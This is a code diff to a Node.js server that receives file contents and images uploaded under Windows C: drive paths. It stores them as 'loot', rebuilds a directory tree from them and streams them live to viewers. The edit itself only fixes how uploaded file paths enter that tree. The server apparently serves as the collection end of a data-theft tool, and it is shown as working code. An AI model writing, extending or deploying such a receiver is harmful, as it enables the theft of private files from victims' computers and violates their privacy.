@@ -68,12 +68,12 @@ function broadcast(type, data) {
 }
 
 // Adds path to the 'tree' which is basically just a parent child structure. The starting parent is always the C: drive
-function addPathToTree(tree, filePath) {
+function addPathToTree(tree, filePath, isFile = false) {
   const parts = filePath.trim().split('\\');
   let current = tree;
   for (let i = 0; i < parts.length; i++) {
     const part = parts[i];
-    if (i === parts.length - 1 && part.includes('.')) {
+    if (i === parts.length - 1 && (isFile || part.includes('.'))) {
       current[part] = null;
     } else {
       if (!current[part]) current[part] = {};
@@ -111,7 +111,7 @@ app.post('/upload/files', requireUploadAuth, (req, res) => {
   const text = req.body.substring(firstNewline + 1);
   console.log('File received', path);
   loot.files[path] = text;
-  addPathToTree(loot.directories, path);  // auto-add to the tree
+  addPathToTree(loot.directories, path, true);  // auto-add to the tree
   saveLoot();
   broadcast('dirs', loot.directories);    // broadcast updated tree
   broadcast('files', { path, text });
@@ -124,7 +124,7 @@ app.post('/upload/image', requireUploadAuth, (req, res) => {
   const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
   console.log('Image received:', path); // for debugging
   loot.images[path] = base64;
-  addPathToTree(loot.directories, path);
+  addPathToTree(loot.directories, path, true);
   saveLoot();
   broadcast('dirs', loot.directories);  
   broadcast('image', { path, base64 }); // broadcast to the active connections
